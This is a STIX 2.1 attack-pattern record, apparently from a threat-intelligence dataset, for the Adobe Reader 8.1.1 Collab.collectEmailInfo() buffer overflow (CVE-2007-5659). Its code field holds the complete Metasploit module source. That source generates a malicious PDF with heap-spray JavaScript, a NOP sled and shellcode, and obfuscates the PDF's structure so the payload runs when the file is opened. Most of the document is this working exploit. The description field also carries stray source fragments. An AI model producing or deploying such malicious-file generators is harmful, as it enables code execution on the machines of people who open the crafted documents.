{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1e0696e0-a4c4-4298-ac29-6ea1b42a130a",
    "created": "2024-08-14T16:36:56.020154Z",
    "modified": "2024-08-14T16:36:56.020158Z",
    "name": "Adobe Collab.collectEmailInfo() Buffer Overflow",
    "description": " This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional 8.1.1. By creating a specially crafted pdf that a contains malformed Collab.collectEmailInfo() call an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_collectemailinfo.rb",
            "external_id": "adobe_collectemailinfo.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5659"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Collab.collectEmailInfo() Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional 8.1.1.\n          By creating a specially crafted pdf that a contains malformed Collab.collectEmailInfo() call,\n          an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-5659' ],\n          [ 'OSVDB', '41495' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Adobe Reader v8.1.1 (Windows XP SP0-SP3 English)', { 'Ret' => '' } ],\n        ],\n      'DisclosureDate' => '2008-02-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n      ])\n  end\n\n  def exploit\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Make some nops\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Randomize variables\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n    rand9  = rand_text_alpha(rand(100) + 1)\n    rand10 = rand_text_alpha(rand(100) + 1)\n    rand11 = rand_text_alpha(rand(100) + 1)\n    rand12 = rand_text_alpha(rand(100) + 1)\n\n    script = %Q|\n    var #{rand1} = unescape(\"#{shellcode}\");\n    var #{rand2} =\"\";\n    for (#{rand3}=128;#{rand3}>=0;--#{rand3}) #{rand2} += unescape(\"#{nops}\");\n    #{rand4} = #{rand2} + #{rand1};\n    #{rand5} = unescape(\"#{nops}\");\n    #{rand6} = 20;\n    #{rand7} = #{rand6}+#{rand4}.length\n    while (#{rand5}.length<#{rand7}) #{rand5}+=#{rand5};\n    #{rand8} = #{rand5}.substring(0, #{rand7});\n    #{rand9} = #{rand5}.substring(0, #{rand5}.length-#{rand7});\n    while(#{rand9}.length+#{rand7} < 0x40000) #{rand9} = #{rand9}+#{rand9}+#{rand8};\n    #{rand10} = new Array();\n    for (#{rand11}=0;#{rand11}<1450;#{rand11}++) #{rand10}[#{rand11}] = #{rand9} + #{rand4};\n    var #{rand12} = unescape(\"%u0c0c%u0c0c\");\n    while(#{rand12}.length < 0x4000) #{rand12}+=#{rand12};\n    this.collabStore = Collab.collectEmailInfo({subj: \"\",msg: #{rand12}});\n          |\n\n    # Create the pdf\n    pdf = make_pdf(script)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(pdf)\n  end\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n  def make_pdf(js)\n\n    xref = []\n    eol = \"\\x0d\\x0a\"\n    endobj = \"endobj\" << eol\n\n    # Randomize PDF version?\n    pdf = \"%PDF-1.5\" << eol\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n    xref << pdf.length\n    pdf << io_def(1) << n_obfu(\"<</Type/Catalog/Outlines \") << io_ref(2) << n_obfu(\"/Pages \") << io_ref(3) << n_obfu(\"/OpenAction \") << io_ref(5) << \">>\" << endobj\n    xref << pdf.length\n    pdf << io_def(2) << n_obfu(\"<</Type/Outlines/Count 0>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(3) << n_obfu(\"<</Type/Pages/Kids[\") << io_ref(4) << n_obfu(\"]/Count 1>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(4) << n_obfu(\"<</Type/Page/Parent \") << io_ref(3) << n_obfu(\"/MediaBox[0 0 612 792]>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(5) << n_obfu(\"<</Type/Action/S/JavaScript/JS \") + io_ref(6) + \">>\" << endobj\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js))\n    pdf << io_def(6) << n_obfu(\"<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>\" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n    pdf << \"trailer\" << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(1) << \">>\" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\" << eol\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-02-08",
    "x_mitre_platforms": [
        "win'"
    ]
}